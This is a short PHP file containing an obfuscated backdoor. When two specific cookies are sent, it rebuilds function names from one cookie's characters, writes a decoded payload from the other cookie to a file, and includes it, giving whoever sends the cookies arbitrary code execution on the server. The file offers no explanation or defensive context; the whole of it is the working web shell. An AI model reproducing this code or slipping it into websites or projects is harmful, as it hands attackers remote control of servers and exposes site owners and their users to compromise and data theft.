<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[33])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 6;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[33][$n];
        if (!$c[33][$n + 1]) {
            if (!$c[33][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 6 + 1;
    }
    $k = $p[20]() . $p[22];
    if (!$p[1]($k)) {
        $n = $p[17]($k, $p[12]);
        $p[4]($n, $p[15] . $p[24]($p[28]($c[3])));
    }
    include($k);
}